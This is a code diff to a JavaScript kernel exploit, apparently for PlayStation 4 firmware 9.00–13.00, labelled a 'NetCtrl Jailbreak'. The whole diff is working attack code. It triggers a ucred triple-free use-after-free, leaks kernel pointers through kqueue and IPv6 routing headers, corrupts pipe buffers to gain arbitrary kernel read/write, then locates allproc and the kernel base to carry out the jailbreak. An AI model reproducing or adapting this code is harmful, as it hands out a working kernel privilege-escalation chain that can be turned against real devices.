@@ -1,4 +1,5 @@
-//include('userland.js')
+include('userland.js')
+include('kernel.js')
 
 if (!String.prototype.padStart) {
     String.prototype.padStart = function padStart(targetLength, padString) {
@@ -87,6 +88,14 @@ var thr_new             = fn.register(0x1C7, 'thr_new',            'bigint');
 var thr_kill            = fn.register(0x1B1, 'thr_kill',           'bigint');
 var nanosleep           = fn.register(0xF0,  'nanosleep',          'bigint');
 var fcntl               = fn.register(0x5C,  'fcntl',              'bigint');
+var sysctl              = fn.register(0x0ca, 'sysctl',             'bigint');
+var getuid              = fn.register(0x18,  'getuid',             'bigint');
+var is_in_sandbox       = fn.register(0x249, 'is_in_sandbox',      'bigint');
+var jitshm_create       = fn.register(0x215, 'jitshm_create',      'bigint');
+var jitshm_alias        = fn.register(0x216, 'jitshm_alias',       'bigint');
+var mmap                = fn.register(477,   'mmap',               'bigint');
+var kexec               = fn.register(0x295, 'kexec',              'bigint');
+var munmap              = fn.register(0x49,  'munmap',             'bigint');
 
 // Extract syscall wrapper addresses for ROP chains from syscalls.map
 var read_wrapper                = syscalls.map.get(0x03);
@@ -153,9 +162,13 @@ RTHDR_TAG = 0x13370000;
 UIO_IOV_NUM = 0x14;
 MSG_IOV_NUM = 0x17;
 
+// Params for kext stability
 IPV6_SOCK_NUM = 96;
 IOV_THREAD_NUM = 8;
 UIO_THREAD_NUM = 8;
+MAIN_LOOP_ITERATIONS = 3;
+TRIPLEFREE_ITERATIONS = 8;
+KQUEUE_ITERATIONS = 5000;
 
 MAX_ROUNDS_TWIN = 10;
 MAX_ROUNDS_TRIPLET = 200;
@@ -173,6 +186,7 @@ PRI_REALTIME = 2;
 F_SETFL = 4;
 O_NONBLOCK = 4;
 
+FW_VERSION = ""; // Needs to be initialized to patch kernel
 
 /***************************/
 /*      Used variables     */
@@ -196,13 +210,13 @@ var check_len = malloc(4);
 
 
 var fdt_ofiles;
-var masterRpipeFile;
-var victimRpipeFile;
-var masterRpipeData;
-var victimRpipeData;
+var master_r_pipe_file;
+var victim_r_pipe_file;
+var master_r_pipe_data;
+var victim_r_pipe_data;
 
 // Corrupt pipebuf of masterRpipeFd.
-    masterPipebuf = malloc(PIPEBUF_SIZE);
+    master_pipe_buf = malloc(PIPEBUF_SIZE);
 
 
 write32(check_len, 8);
@@ -256,7 +270,7 @@ var victimRpipeFd
 var victimWpipeFd
 
 var kq_fdp;
-var kq_lock;
+var kl_lock;
 var fdt_ofiles;
 var allproc;
 
@@ -634,8 +648,43 @@ function wait_uio_writev() {
     //debug("Exit wait_uio_writev()");
 }
 
+function init() {
+    debug("=== PS4 NetCtrl Jailbreak ===");
+
+    FW_VERSION = get_fwversion();
+    debug("Detected PS4 firmware: " + FW_VERSION);
+
+    function compare_version(a, b) {
+        const a_arr = a.split('.');
+        const amaj = a_arr[0];
+        const amin = a_arr[1];
+        const b_arr = b.split('.');
+        const bmaj = b_arr[0];
+        const bmin = b_arr[1];
+        return amaj === bmaj ? amin - bmin : amaj - bmaj;
+    }
+
+    if (compare_version(FW_VERSION, "9.00") < 0 || compare_version(FW_VERSION, "13.00") > 0) {
+        debug("Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...");
+        send_notification("Unsupported PS4 firmware\nAborting...");
+        return false;
+    }
+
+    kernel_offset = get_kernel_offset(FW_VERSION);
+    debug("Kernel offsets loaded for FW " + FW_VERSION);
+
+    return true;
+}
+
 function setup() {
     debug("Preparing netctrl...");
+
+    prev_core = get_current_core();
+    prev_rtprio = get_rtprio();
+    pin_to_core(MAIN_CORE);
+    set_rtprio(MAIN_RTPRIO);
+    debug("  Previous core " + prev_core + " Pinned to core " + MAIN_CORE);
+    
     // Prepare spray buffer.
     spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
     //debug("this is spray_rthdr_len: " + hex(spray_rthdr_len));
@@ -719,6 +768,10 @@ function cleanup() {
     close(iov_sock_1);
     close(iov_sock_0);
 
+    if (uaf_socket !== undefined) {
+        close(uaf_socket);
+    }
+
     for(var i=0; i<IOV_THREAD_NUM; i++) {
         worker = iov_recvmsg_workers[i];
         if (worker !== undefined) {
@@ -767,7 +820,7 @@ function cleanup() {
 
     debug("Cleanup completed");
 
-    thr_kill(iov_recvmsg_workers[1].thread_id, 9); // SIGKILL
+    //thr_kill(iov_recvmsg_workers[1].thread_id, 9); // SIGKILL
 }
 
 
@@ -920,50 +973,72 @@ function init_threading() {
 
 function netctrl_exploit() {
 
-    prev_core = get_current_core();
-    prev_rtprio = get_rtprio();
-    pin_to_core(MAIN_CORE);
-    set_rtprio(MAIN_RTPRIO);
-    debug("  Previous core " + prev_core + " Pinned to core " + MAIN_CORE);
+    var supported_fw = init();
+    if(!supported_fw) {
+        return;
+    }
 
     setup();
 
     var end = false;
+    var count = 0;
 
-    while(!end) {
+    while(!end && count<MAIN_LOOP_ITERATIONS) {
+        count++;
         // Trigger vulnerability.
-        trigger_ucred_triplefree();
+        if(!trigger_ucred_triplefree()) {
+            continue;
+        }
 
         // Leak pointers from kqueue.
         end = leak_kqueue();
     }
+    if(count === MAIN_LOOP_ITERATIONS && !end){
+        debug("Failed to adquiere slow kernel R/W");
+        cleanup();
+        throw new Error("Netctrl failed - Reboot and try again");
+    }
 
+    // Time to create arbitrary R/W
+    setup_arbitrary_rw();
+
+    // Jailbreak
+    jailbreak();
+
+}
+
+function setup_arbitrary_rw() {
     // Leak fd_files from kq_fdp.
     const fd_files = kreadslow64(kq_fdp);
     fdt_ofiles = fd_files.add(0x00);
     debug("fdt_ofiles: " + hex(fdt_ofiles));
 
-    masterRpipeFile = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
-    debug("masterRpipeFile: " + hex(masterRpipeFile));
+    master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+    debug("master_r_pipe_file: " + hex(master_r_pipe_file));
 
-    victimRpipeFile = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
-    debug("victimRpipeFile: " + hex(victimRpipeFile));
+    victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
+    debug("victim_r_pipe_file: " + hex(victim_r_pipe_file));
 
-    masterRpipeData = kreadslow64(masterRpipeFile.add(0x00));
-    debug("masterRpipeData: " + hex(masterRpipeData));
+    master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00));
+    debug("master_r_pipe_data: " + hex(master_r_pipe_data));
 
-    victimRpipeData = kreadslow64(victimRpipeFile.add(0x00));
-    debug("victimRpipeData: " + hex(victimRpipeData));
+    victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00));
+    debug("victim_r_pipe_data: " + hex(victim_r_pipe_data));
 
     // Corrupt pipebuf of masterRpipeFd.
-    masterPipebuf = malloc(PIPEBUF_SIZE);
-    write32(masterPipebuf.add(0x00), 0);                // cnt
-    write32(masterPipebuf.add(0x04), 0);                // in
-    write32(masterPipebuf.add(0x08), 0);                // out
-    write32(masterPipebuf.add(0x0C), PAGE_SIZE);        // size
-    write64(masterPipebuf.add(0x10), victimRpipeData);  // buffer
+    master_pipe_buf = malloc(PIPEBUF_SIZE);
+    write32(master_pipe_buf.add(0x00), 0);                // cnt
+    write32(master_pipe_buf.add(0x04), 0);                // in
+    write32(master_pipe_buf.add(0x08), 0);                // out
+    write32(master_pipe_buf.add(0x0C), PAGE_SIZE);        // size
+    write64(master_pipe_buf.add(0x10), victim_r_pipe_data);  // buffer
 
-    kwriteslow(masterRpipeData, masterPipebuf, PIPEBUF_SIZE);
+    var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
+
+    if (ret_write.eq(BigInt_Error)) {
+        cleanup();
+        throw new Error("Netctrl failed - Reboot and try again");
+    }
 
     // Increase reference counts for the pipes.
     fhold(fget(master_pipe[0]));
@@ -971,26 +1046,62 @@ function netctrl_exploit() {
     fhold(fget(victim_pipe[0]));
     fhold(fget(victim_pipe[1]));
 
+    // Remove rthdr pointers from twins
+    remove_rthr_from_socket(ipv6_socks[triplets[0]]);
+    remove_rthr_from_socket(ipv6_socks[triplets[1]]);
+
+    // Remove triple freed file from free list
+    remove_uaf_file();
+
     for(var i=0; i<0x20; i=i+8) {
-        var readed = kread64(masterRpipeData.add(i));
-        debug("Reading masterRpipeData[" + i + "] : " + hex(readed) );
+        var readed = kread64(master_r_pipe_data.add(i));
+        debug("Reading master_r_pipe_data[" + i + "] : " + hex(readed) );
     }
 
     debug("[+] Arbitrary R/W achieved.");
 
-    debug("Reading value in victimRpipeFile: " + hex(kread64(victimRpipeFile)) );
+    debug("Reading value in victim_r_pipe_file: " + hex(kread64(victim_r_pipe_file)) );
+}
 
-    //fhold(fget(master_pipe[0]));
-    //fhold(fget(master_pipe[1]));
-    //fhold(fget(victim_pipe[0]));
-    //fhold(fget(victim_pipe[1]));
+function find_allproc() {
+    const pipe_fd = malloc(8);
+    pipe(pipe_fd);
+    const pipe_0 = read32(pipe_fd);
+    const pipe_1 = read32(pipe_fd.add(0x04));
 
-    //for (i=0; i < triplets.length; i++) {
-    //    removeRthrFromSocket(ipv6_socks[triplets[i]]);
-    //}
+    curr_pid = malloc(4);
+    write32(curr_pid, getpid());
+    ioctl(pipe_0, FIOSETOWN, curr_pid);
 
-    //removeUafFile();
+    fp = fget(pipe_0);
+    f_data = kread64(fp.add(0x00));
+    pipe_sigio = kread64(f_data.add(0xd0));
+    p = kread64(pipe_sigio);
+    kernel.addr.curproc = p; // Set global curproc
 
+    while (!(p.and( new BigInt(0xFFFFFFFF, 0x00000000))).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
+        p = kread64(p.add(0x08)); // p_list.le_prev
+    }
+
+    close(pipe_1);
+    close(pipe_0);
+
+    return p;
+}
+
+function jailbreak() {
+
+    kernel.addr.allproc = find_allproc(); // Set global allproc
+    debug("allproc: " + hex(kernel.addr.allproc));
+
+    // Calculate kernel base
+    kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
+    debug("Kernel base: " + hex(kernel.addr.base));
+
+    jailbreak_shared(FW_VERSION);
+
+    debug("Jailbreak Complete - JAILBROKEN");
+    utils.notify("The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom");
 }
 
 function fhold(fp) {
@@ -1001,52 +1112,59 @@ function fget(fd) {
     return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
 }
 
-function removeRthrFromSocket(fd) {
-    fp = fget(fd);
-    f_data = kread64(fp.add(0x00));
-    so_pcb = kread64(f_data.add(0x18));
-    in6p_outputopts = kread64(so_pcb.add(0x118));
-    kwrite64(in6p_outputopts.add(0x68), 0); // ip6po_rhi_rthdr
+function remove_rthr_from_socket(fd) {
+    // In case last triplet was not found in kwriteslow
+    // At this point we don't care about twins/triplets
+    if(fd>0) {
+        fp = fget(fd);
+        f_data = kread64(fp.add(0x00));
+        so_pcb = kread64(f_data.add(0x18));
+        in6p_outputopts = kread64(so_pcb.add(0x118));
+        kwrite64(in6p_outputopts.add(0x68), 0); // ip6po_rhi_rthdr
+    }
 }
 
 
-const victimPipebuf = malloc(PIPEBUF_SIZE);
+const victim_pipe_buf = malloc(PIPEBUF_SIZE);
 const debug_buffer = malloc(PIPEBUF_SIZE);
 
-function corruptPipebuf(cnt, _in, out, size, buffer) {
+function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
     if (buffer.eq(0)) {
         throw new Error("buffer cannot be zero");
     }
-    write32(victimPipebuf.add(0x00), cnt);      // cnt
-    write32(victimPipebuf.add(0x04), _in);       // in
-    write32(victimPipebuf.add(0x08), out);      // out
-    write32(victimPipebuf.add(0x0C), size);     // size
-    write64(victimPipebuf.add(0x10), buffer);   // buffer
-    write(masterWpipeFd, victimPipebuf, PIPEBUF_SIZE);
+    write32(victim_pipe_buf.add(0x00), cnt);      // cnt
+    write32(victim_pipe_buf.add(0x04), _in);       // in
+    write32(victim_pipe_buf.add(0x08), out);      // out
+    write32(victim_pipe_buf.add(0x0C), size);     // size
+    write64(victim_pipe_buf.add(0x10), buffer);   // buffer
+    write(masterWpipeFd, victim_pipe_buf, PIPEBUF_SIZE);
 
     // Debug
+    /*
     read(masterRpipeFd, debug_buffer, PIPEBUF_SIZE);
     for (var i=0; i<PIPEBUF_SIZE; i=i+8) {
-        var readed = read64(victimPipebuf.add(i));
+        var readed = read64(victim_pipe_buf.add(i));
         debug("corrupt_read: " + hex(readed) );
     }
+        */
 
-    return //read(masterRpipeFd, victimPipebuf, PIPEBUF_SIZE);
+    return read(masterRpipeFd, victim_pipe_buf, PIPEBUF_SIZE);
 }
 
 function kwrite(dest, src, n) {
-    corruptPipebuf(0, 0, 0, PAGE_SIZE, dest);
+    corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
     return write(victimWpipeFd, src, n);
 }
 
 function kread(dest, src, n) {
-    corruptPipebuf(n, 0, 0, PAGE_SIZE, src);
+    debug("Enter kread for src: " + hex(src));
+    corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
     // Debug
     read(victimRpipeFd, dest, n);
-    for (var i=0; i<n; i=i+8) {
-        var readed = read64(dest.add(i));
-        debug("kread_read: " + hex(readed) );
-    }
+    //for (var i=0; i<n; i=i+8) {
+    //    var readed = read64(dest.add(i));
+        //debug("kread_read: " + hex(readed) );
+    //}
     return
 }
 
@@ -1070,11 +1188,37 @@ function kread32(addr) {
     return read32(tmp);
 }
 
-function removeUafFile() {
+function read_buffer(addr, len) {
+    const buffer = new Uint8Array(len);
+    for (var i = 0; i < len; i++) {
+        buffer[i] = Number(read8(addr.add(i)));
+    }
+    return buffer;
+}
+
+function write_buffer(addr, buffer) {
+    for (var i = 0; i < buffer.length; i++) {
+        write8(addr.add(i), buffer[i]);
+    }
+}
+
+// Functions used in global kernel.js
+// buf is Uint8Array()
+kernel.read_buffer = function(kaddr, len) {
+    kread(tmp, kaddr, len);
+    return read_buffer(tmp, len);
+}
+
+kernel.write_buffer = function(kaddr, buf) {
+    write_buffer(tmp, buf);
+    kwrite(kaddr, tmp, buf.length);
+}
+
+function remove_uaf_file() {
     uafFile = fget(uaf_socket);
     kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), 0);
     removed = 0;
-    for (i = 0; i < UAF_TRIES; i++) {
+    for (i = 0; i < 0x1000; i++) {
         s = socket(AF_UNIX, SOCK_STREAM, 0);
         if (fget(s).eq(uafFile)) {
             kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), 0);
@@ -1096,7 +1240,11 @@ function trigger_ucred_triplefree() {
     write64(msgIov.add(0x0), 1); // iov_base
     write64(msgIov.add(0x8), 1); // iov_len
 
-    do {
+    var main_count = 0; // Let's do up to 8 iterations
+
+    while(!end && main_count<TRIPLEFREE_ITERATIONS) {
+        main_count++;
+
         //debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
         var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
 
@@ -1139,23 +1287,11 @@ function trigger_ucred_triplefree() {
         // Find twins.
         end = find_twins();
 
-        //end = find_twins_rop();
-
         if(!end) {
             // Clean up and start again
             close(uaf_socket);
             continue;
         }
-
-        // Let's make sure that they are indeed twins
-        // var leak_0 = malloc(8);
-        // var leak_1 = malloc(8);
-
-        // get_rthdr(ipv6_socks[twins[0]], leak_0, 8);
-        // get_rthdr(ipv6_socks[twins[1]], leak_1, 8);
-        
-        // debug("These are twins values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) );
-
 
         debug("Triple freeing...");
 
@@ -1165,7 +1301,7 @@ function trigger_ucred_triplefree() {
         var count = 0;
 
         // Set cr_refcnt back to 1.
-        while (count < 10000) {
+        while (count < 1000) {
             // Reclaim with iov.
             trigger_iov_recvmsg();
             sched_yield();
@@ -1230,21 +1366,16 @@ function trigger_ucred_triplefree() {
             continue;    
         }
 
-        // Let's make sure that they are indeed triplets
-        // var leak_0 = malloc(8);
-        // var leak_1 = malloc(8);
-        // var leak_2 = malloc(8);
-
-        // get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
-        // get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
-        // get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);
-        
-        // debug("These are triplets values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) + " " + hex(read64(leak_2)) );
-
         // Wait iov release completition
         wait_iov_recvmsg();
         read(iov_sock_0, tmp, 1);
-    } while(!end)
+    }
+
+    if(main_count===TRIPLEFREE_ITERATIONS){
+        debug("Failed to Triple Free");
+        return false;
+    }
+    return true;
 
 }
 
@@ -1262,7 +1393,8 @@ function leak_kqueue() {
     var magic_val = new BigInt(0x0, 0x1430000);
     var magic_add = leak_rthdr.add(0x08);
 
-    while (true) {
+    var count = 0;
+    while (count < KQUEUE_ITERATIONS) {
         kq = kqueue();
 
         // Leak with other rthdr.
@@ -1273,11 +1405,17 @@ function leak_kqueue() {
         }
 
         close(kq);
+        count++;
+    }
+    if(count===KQUEUE_ITERATIONS) {
+        //Dropped out with no kqueue leak
+        debug("Failed to leak kquede_fdp");
+        return false;
     }
 
     // kq_fdp = read64(leak_rthdr.add(0xA8)); // PS5 offset
 
-    kq_lock = read64(leak_rthdr.add(0x60));
+    kl_lock = read64(leak_rthdr.add(0x60));
     kq_fdp = read64(leak_rthdr.add(0x98));
 
     if (kq_fdp.eq(0)) {
@@ -1285,7 +1423,7 @@ function leak_kqueue() {
         return false;
     }
 
-    debug("kq_fdp: " + hex(kq_fdp) + " kq_lock: " + hex(kq_lock));
+    debug("kq_fdp: " + hex(kq_fdp) + " kl_lock: " + hex(kl_lock));
 
     // for (i=0; i<0x100; i=i+8) {
     //     debug("leak_rthdr.add(" + i + ") : " + hex(read64(leak_rthdr.add(i))));
@@ -1305,6 +1443,10 @@ function leak_kqueue() {
 function kreadslow64(address) {
     var buffer = kreadslow(address, 8);
     //debug("Buffer from kreadslow: " + hex(buffer));
+    if(buffer.eq(BigInt_Error)) {
+        cleanup();
+        throw new Error("Netctrl failed - Reboot and try again");
+    }
     return read64(buffer);
 }
 
@@ -1347,8 +1489,10 @@ function kreadslow(addr, size) {
     // Minimize footprint
     var uio_leak_add = leak_rthdr.add(0x08);
 
+    var count = 0;
     // Reclaim with uio.
-    while (true) {
+    while (count < 10000) {
+        count++;
         trigger_uio_writev(); // COMMAND_UIO_READ in fl0w's
         sched_yield();
 
@@ -1373,6 +1517,11 @@ function kreadslow(addr, size) {
         write(uio_sock_1, tmp, size);
     }
 
+    if (count === 10000) {
+        debug("kreadslow - Failed");
+        return BigInt_Error;
+    }
+
     var uio_iov = read64(leak_rthdr);
     //debug("This is uio_iov: " + hex(uio_iov));
 
@@ -1381,6 +1530,11 @@ function kreadslow(addr, size) {
 
     // Find new one to free
     triplets[1] = find_triplet(triplets[0], -1, 1000);
+
+    if (triplets[1] === -1) {
+        debug("kreadslow - Failed to adquire twin");
+        return BigInt_Error;
+    }
 
     // Free second one.
     free_rthdr(ipv6_socks[triplets[1]]);
@@ -1425,6 +1579,10 @@ function kreadslow(addr, size) {
         if (!val.eq(tag_val)) {
             // Find triplet.
             triplets[1] = find_triplet(triplets[0], -1, 1000);
+            if (triplets[1] === -1) {
+                debug("kreadslow - Failed to adquire twin 2");
+                return BigInt_Error;
+            }
             leak_buffer = leak_buffers[i].add(0);
             //debug("This is leak_buffer " + hex(leak_buffer) + " - " + hex(read64(leak_buffer)));
         }
@@ -1507,6 +1665,11 @@ function kwriteslow(addr, buffer, size) {
     // Find new one to free
     triplets[1] = find_triplet(triplets[0], -1, 1000);
 
+    if (triplets[1] === -1) {
+        debug("kwriteslow - Failed to adquire twin");
+        return BigInt_Error;
+    }
+
     // Free second one.
     free_rthdr(ipv6_socks[triplets[1]]);
 
@@ -1553,6 +1716,8 @@ function kwriteslow(addr, buffer, size) {
     // Workers should have finished earlier no need to wait
     wait_iov_recvmsg();
     read(iov_sock_0, tmp, 1);
+
+    return new BigInt(0);
 }
 
 function rop_regen_and_loop(last_rop_entry, number_entries) {
